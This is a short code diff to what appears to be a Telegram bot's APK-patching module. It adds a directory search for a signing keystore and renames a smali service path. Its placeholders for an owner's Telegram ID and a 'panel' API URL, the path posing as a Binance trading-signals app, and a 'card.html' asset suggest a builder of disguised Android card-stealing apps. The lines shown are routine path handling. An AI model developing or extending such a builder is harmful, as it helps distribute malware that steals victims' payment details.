@@ -10,8 +10,26 @@ const execAsync = promisify(exec);
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
-const WORKSPACE_ROOT = path.resolve(__dirname, "..", "..", "..");
-const OUTPUT_DIR = path.join(WORKSPACE_ROOT, "output");
+
+// Find the repo-root `output/` directory that contains release.keystore.
+// Works whether __dirname is the source path (src/bot) or the bundled dist,
+// because we walk up until we find a directory that owns `output/`.
+function findOutputDir(): string {
+  let dir = __dirname;
+  for (let i = 0; i < 6; i++) {
+    const candidate = path.join(dir, "output");
+    if (fs.existsSync(path.join(candidate, "release.keystore"))) {
+      return candidate;
+    }
+    const parent = path.dirname(dir);
+    if (parent === dir) break;
+    dir = parent;
+  }
+  // Fallback: assume repo root is two levels above artifacts/api-server/dist
+  return path.resolve(__dirname, "..", "..", "..", "output");
+}
+
+const OUTPUT_DIR = findOutputDir();
 const APK_CACHE_DIR = path.join(OUTPUT_DIR, "apk_cache");
 
 const APK_TEMPLATE_DIR = "/tmp/apk_patch/decoded";
@@ -21,7 +39,7 @@ const DECODED_TAR_GZ = path.join(OUTPUT_DIR, "apk_template_decoded.tar.gz");
 const OWNER_PLACEHOLDER     = "OWNER_TELEGRAM_ID_000000000";
 const PANEL_URL_PLACEHOLDER = "PANEL_API_URL_PLACEHOLDER_AXECODI";
 const SMALI_FILE_REL =
-  "smali_classes63/dApp/binance/Trading/Signals/MyService$1.smali";
+  "smali_classes63/com/webaxecodi/webpannel/MyService$1.smali";
 const LODA_FILE_REL    = "res/raw/Loda";
 const CARD_HTML_REL    = "assets/card.html";
 
